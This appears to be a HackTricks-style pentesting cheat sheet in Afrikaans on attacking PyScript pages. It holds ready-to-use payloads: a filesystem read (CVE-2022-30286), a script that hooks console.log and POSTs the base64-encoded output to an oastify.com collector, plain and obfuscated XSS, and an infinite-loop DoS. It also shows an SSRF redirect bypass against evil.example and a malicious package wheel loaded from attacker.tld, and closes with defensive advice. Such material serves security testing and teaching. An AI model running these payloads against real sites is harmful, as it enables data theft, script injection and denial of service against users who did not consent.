# Pyscript

{{#include ../../banners/hacktricks-training.md}}

## PyScript Pentesting Gids

PyScript is 'n nuwe raamwerk wat ontwikkel is om Python in HTML te integreer sodat dit saam met HTML gebruik kan word. In hierdie spiekbrief sal jy vind hoe om PyScript vir jou penetrasietoetsdoeleindes te gebruik.

### Dumping / Herwin van lêers uit die Emscripten virtuele geheue lêerstelsel:

`CVE ID: CVE-2022-30286`\
\
Kode:
```html
<py-script>
with open('/lib/python3.10/site-packages/_pyodide/_base.py', 'r') as fin: out
= fin.read() print(out)
</py-script>
```
![](https://user-images.githubusercontent.com/66295316/166847974-978c4e23-05fa-402f-884a-38d91329bac3.png)

### [OOB Data Exfiltration van die Emscripten virtuele geheue lêerstelsel (konsole monitering)](https://github.com/s/jcd3T19P0M8QRnU1KRDk/~/changes/Wn2j4r8jnHsV8mBiqPk5/blogs/the-art-of-vulnerability-chaining-pyscript)

`CVE ID: CVE-2022-30286`\
\
Kode:
```html
<py-script>
x = "CyberGuy" if x == "CyberGuy": with
open('/lib/python3.10/asyncio/tasks.py') as output: contents = output.read()
print(contents) print('
<script>
console.pylog = console.log
console.logs = []
console.log = function () {
console.logs.push(Array.from(arguments))
console.pylog.apply(console, arguments)
fetch("http://9hrr8wowgvdxvlel2gtmqbspigo8cx.oastify.com/", {
method: "POST",
headers: { "Content-Type": "text/plain;charset=utf-8" },
body: JSON.stringify({ content: btoa(console.logs) }),
})
}
</script>
')
</py-script>
```
![](https://user-images.githubusercontent.com/66295316/166848198-49f71ccb-73cf-476b-b8f3-139e6371c432.png)

### Cross Site Scripting (Gewone)

Code:
```python
<py-script>
print("<img src=x onerror='alert(document.domain)'>")
</py-script>
```
![](https://user-images.githubusercontent.com/66295316/166848393-e835cf6b-992e-4429-ad66-bc54b98de5cf.png)

### Cross Site Scripting (Python Obfuscated)

Kode:
```python
<py-script>
sur = "\u0027al";fur = "e";rt = "rt"
p = "\x22x$$\x22\x29\u0027\x3E"
s = "\x28";pic = "\x3Cim";pa = "g";so = "sr"
e = "c\u003d";q = "x"
y = "o";m = "ner";z = "ror\u003d"

print(pic+pa+" "+so+e+q+" "+y+m+z+sur+fur+rt+s+p)
</py-script>
```
![](https://user-images.githubusercontent.com/66295316/166848370-d981c94a-ee05-42a8-afb8-ccc4fc9f97a0.png)

### Cross Site Scripting (JavaScript Obfuscation)

Kode:
```html
<py-script>
prinht(""
<script>
var _0x3675bf = _0x5cf5
function _0x5cf5(_0xced4e9, _0x1ae724) {
var _0x599cad = _0x599c()
return (
(_0x5cf5 = function (_0x5cf5d2, _0x6f919d) {
_0x5cf5d2 = _0x5cf5d2 - 0x94
var _0x14caa7 = _0x599cad[_0x5cf5d2]
return _0x14caa7
}),
_0x5cf5(_0xced4e9, _0x1ae724)
)
}
;(function (_0x5ad362, _0x98a567) {
var _0x459bc5 = _0x5cf5,
_0x454121 = _0x5ad362()
while (!![]) {
try {
var _0x168170 =
(-parseInt(_0x459bc5(0x9e)) / 0x1) *
(parseInt(_0x459bc5(0x95)) / 0x2) +
(parseInt(_0x459bc5(0x97)) / 0x3) *
(-parseInt(_0x459bc5(0x9c)) / 0x4) +
-parseInt(_0x459bc5(0x99)) / 0x5 +
(-parseInt(_0x459bc5(0x9f)) / 0x6) *
(parseInt(_0x459bc5(0x9d)) / 0x7) +
(-parseInt(_0x459bc5(0x9b)) / 0x8) *
(-parseInt(_0x459bc5(0x9a)) / 0x9) +
-parseInt(_0x459bc5(0x94)) / 0xa +
(parseInt(_0x459bc5(0x98)) / 0xb) *
(parseInt(_0x459bc5(0x96)) / 0xc)
if (_0x168170 === _0x98a567) break
else _0x454121["push"](_0x454121["shift"]())
} catch (_0x5baa73) {
_0x454121["push"](_0x454121["shift"]())
}
}
})(_0x599c, 0x28895),
prompt(document[_0x3675bf(0xa0)])
function _0x599c() {
var _0x34a15f = [
"15170376Sgmhnu",
"589203pPKatg",
"11BaafMZ",
"445905MAsUXq",
"432bhVZQo",
"14792bfmdlY",
"4FKyEje",
"92890jvCozd",
"36031bizdfX",
"114QrRNWp",
"domain",
"3249220MUVofX",
"18cpppdr",
]
_0x599c = function () {
return _0x34a15f
}
return _0x599c()
}
</script>
"")
</py-script>
```
![](https://user-images.githubusercontent.com/66295316/166848442-2aece7aa-47b5-4ee7-8d1d-0bf981ba57b8.png)

### DoS-aanval (Oneindige lus)

Kode:
```html
<py-script>
while True:
print("&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;")
</py-script>
```
![](https://user-images.githubusercontent.com/66295316/166848534-3e76b233-a95d-4cab-bb2c-42dbd764fefa.png)

---

## Nuwe kwesbaarhede & tegnieke (2023-2025)

### Server-Side Request Forgery via onbeheerde omleidings (CVE-2025-50182)

`urllib3 < 2.5.0` ignoreer die `redirect` en `retries` parameters wanneer dit uitgevoer word **binne die Pyodide runtime** wat saam met PyScript verskaf word. Wanneer 'n aanvaller die teiken-URL's kan beïnvloed, kan hulle die Python-kode dwing om kruis-domein omleidings te volg, selfs wanneer die ontwikkelaar dit eksplisiet gedeaktiveer het ‑ wat effektief die anti-SSRF logika omseil.
```html
<script type="py">
import urllib3
http = urllib3.PoolManager(retries=False, redirect=False)  # supposed to block redirects
r = http.request("GET", "https://evil.example/302")      # will STILL follow the 302
print(r.status, r.url)
</script>
```
Gepatch in `urllib3 2.5.0` – werk die pakket op in jou PyScript beeld of pin 'n veilige weergawe in `packages = ["urllib3>=2.5.0"]`. Sien die amptelike CVE-inskrywing vir besonderhede.

### Arbitraire pakketlaai & voorsieningskettingaanvalle

Aangesien PyScript arbitraire URL's in die `packages` lys toelaat, kan 'n kwaadwillige akteur wat konfigurasie kan wysig of inspuit **volledig arbitraire Python** in die slagoffer se blaaier uitvoer:
```html
<py-config>
packages = ["https://attacker.tld/payload-0.0.1-py3-none-any.whl"]
</py-config>
<script type="py">
import payload  # executes attacker-controlled code during installation
</script>
```
*Net sui-Python-wiele is nodig – geen WebAssembly-kompilasietrede is nodig nie.* Maak seker dat konfigurasie nie deur die gebruiker beheer word nie en host vertroude wiele op jou eie domein met HTTPS & SRI-hashes.

### Uitvoer sanitasie veranderinge (2023+)

* `print()` steed rou HTML in en is dus XSS-gevoelig (voorbeelde hierbo).
* Die nuwer `display()` helper **ontvlug HTML per standaard** – rou opmaak moet in `pyscript.HTML()` toegedraai word.
```python
from pyscript import display, HTML

display("<b>escaped</b>")          # renders literally

display(HTML("<b>not-escaped</b>")) # executes as HTML -> potential XSS if untrusted
```
Dit gedrag is in 2023 bekendgestel en is gedokumenteer in die amptelike Built-ins-gids. Vertrou op `display()` vir onbetroubare invoer en vermy om `print()` direk aan te roep.

---

## Verdedigende Beste Praktyke

* **Hou pakkette op datum** – opgradeer na `urllib3 >= 2.5.0` en herbou gereeld wiele wat saam met die webwerf gestuur word.
* **Beperk pakketbronne** – verwys slegs na PyPI-names of selfde-oorsprong URL's, idealiter beskerm met Sub-resource Integrity (SRI).
* **Versterk Inhoudsekuriteitsbeleid** – verbied inline JavaScript (`script-src 'self' 'sha256-…'`) sodat ingeslote `<script>` blokke nie kan uitvoer nie.
* **Verbied gebruiker-geleverde `<py-script>` / `<script type="py">` tags** – saniteer HTML op die bediener voordat dit teruggegee word aan ander gebruikers.
* **Isoleer werkers** – as jy nie sinchroniese toegang tot die DOM van werkers nodig het nie, stel die `sync_main_only` vlag in om die `SharedArrayBuffer` kop vereistes te vermy.

## Verwysings

* [NVD – CVE-2025-50182](https://nvd.nist.gov/vuln/detail/CVE-2025-50182)
* [PyScript Built-ins dokumentasie – `display` & `HTML`](https://docs.pyscript.net/2024.6.1/user-guide/builtins/)

{{#include ../../banners/hacktricks-training.md}}
